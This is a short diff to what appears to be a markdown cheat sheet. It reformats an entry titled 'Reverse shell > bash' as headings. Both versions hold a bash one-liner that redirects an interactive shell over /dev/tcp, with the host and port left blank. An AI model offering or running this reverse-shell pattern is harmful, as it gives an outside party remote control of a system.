@@ -63,5 +63,5 @@ ____
 
 ____
 
-Reverse shell > bash
-bash -c 'exec bash -i &>/dev/tcp// <&1'
+#### Reverse shell > bash
+###### bash -c 'exec bash -i &>/dev/tcp// <&1'
